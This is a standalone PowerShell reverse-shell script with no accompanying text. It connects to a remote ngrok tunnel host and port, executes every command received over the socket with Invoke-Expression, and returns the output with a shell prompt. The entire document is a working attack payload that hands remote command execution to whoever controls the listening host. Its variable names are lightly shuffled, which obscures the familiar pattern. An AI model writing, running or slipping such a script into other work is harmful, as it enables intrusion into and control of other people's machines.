$o = 'System.Net.Sockets.TCPClient'; $p = '0.tcp.ap.ngrok.io'; $r = 14636
$c = New-Object $o($p, $r); $s = $c.GetStream()
[byte[]]$b = 0..65535|%{0}
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object Text.ASCIIEncoding).GetString($b,0, $i)
    $sb = (iex $d 2>&1 | Out-String ) + 'PS ' + (pwd).Path + '> '
    $sb2 = ([text.encoding]::ASCII).GetBytes($sb)
    $s.Write($sb2,0,$sb2.Length); $s.Flush()
}
$c.Close()